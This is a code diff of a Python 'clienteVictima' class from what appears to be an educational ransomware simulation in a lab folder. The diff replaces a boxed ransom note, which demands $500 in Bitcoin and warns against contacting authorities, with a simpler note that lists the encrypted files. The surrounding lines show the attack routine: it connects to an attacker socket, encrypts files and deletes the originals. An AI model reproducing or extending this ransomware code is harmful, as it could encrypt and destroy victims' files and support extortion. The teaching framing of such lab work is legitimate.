@@ -56,53 +56,37 @@ class clienteVictima:
             f_out.write(iv + ciphertext)
 
     def generar_nota_rescate(self):
-        """Genera la nota de rescate en el directorio sample_recovered"""
+        os.makedirs("lab/sample_cipher", exist_ok=True)
         os.makedirs("lab/sample_recovered", exist_ok=True)
-        
-        nota_rescate = f"""
-╔══════════════════════════════════════════════════════════════════════════════╗
-║                              ⚠️  ADVERTENCIA  ⚠️                              ║
-╠══════════════════════════════════════════════════════════════════════════════╣
-║                                                                              ║
-║  🚨 SUS ARCHIVOS HAN SIDO CIFRADOS 🚨                                       ║
-║                                                                              ║
-║  Todos sus archivos importantes han sido cifrados usando un algoritmo       ║
-║  de cifrado militar de grado AES-256.                                       ║
-║                                                                              ║
-║  📁 Archivos afectados:                                                      ║
-║                                                                               ║
-║     • Todos los archivos en lab/sample_plain/                                ║
-║                                                                              ║
-║  🔐 ¿Qué significa esto?                                                     ║
-║     Sus archivos están seguros, pero inaccesibles sin la clave de           ║
-║     descifrado. Solo nosotros podemos restaurarlos.                         ║
-║                                                                              ║
-║  💰 ¿Cómo recuperar sus archivos?                                            ║
-║     1. Pague el rescate de $500 USD en Bitcoin                              ║
-║     2. Envíe el comprobante a: ransomware@darkweb.com                       ║
-║     3. Recibirá la clave de descifrado en 24 horas                          ║
-║                                                                              ║
-║  ⏰ TIEMPO LIMITE: 48 horas                                                  ║
-║     Después de este tiempo, la clave será destruida permanentemente.        ║
-║                                                                              ║
-║  🚫 NO INTENTE:                                                              ║
-║     • Descifrar los archivos usted mismo                                     ║
-║     • Usar software de recuperación                                          ║
-║     • Contactar a las autoridades                                            ║
-║                                                                              ║
-║  📧 Contacto: ransomware@darkweb.com                                        ║
-║  🆔 ID de Víctima: {self.victim_id}                                          ║
-║                                                                              ║
-║  Esta es una simulación educativa. No se ha realizado ningún daño real.     ║
-║                                                                              ║
-╚══════════════════════════════════════════════════════════════════════════════╝
 
+        archivos_cifrados = []
+        try:
+            archivos_cifrados = [f for f in os.listdir("lab/sample_cipher") if os.path.isfile(os.path.join("lab/sample_cipher", f))]
+        except Exception:
+            archivos_cifrados = []
+
+        lista_archivos = "\n".join([f" - {a}" for a in archivos_cifrados]) if archivos_cifrados else " (No se encontraron archivos cifrados)"
+
+        nota_rescate = f"""
+RANSOM NOTE - ID de Víctima: {self.victim_id}
+
+ATENCIÓN: Sus archivos han sido cifrados.
+
+Archivos cifrados:
+{lista_archivos}
+
+Para recuperar sus archivos debe seguir las instrucciones de pago indicadas en la comunicación.
+Después de verificar el pago le será proporcionada la clave de descifrado.
+
+Esta es una simulación educativa.
 """
-        
-        with open("lab/sample_recovered/ransom_note.txt", "w", encoding="utf-8") as f:
+
+        ruta_recovered_note = os.path.join("lab", "sample_recovered", "ransom_note.txt")
+
+        with open(ruta_recovered_note, "w", encoding="utf-8") as f:
             f.write(nota_rescate)
-        
-        print("Nota de rescate creada en lab/sample_recovered/ransom_note.txt")
+
+        print(f"Nota de rescate creada en {ruta_recovered_note}")
 
     def ejecutar_ataque(self):
         client_socket = self.conectar_atacante()
@@ -126,7 +110,6 @@ class clienteVictima:
             os.remove(entrada)
             print(f"{archivo} cifrado y original eliminado")
 
-        # Generar nota de rescate
         self.generar_nota_rescate()
         
         client_socket.close()
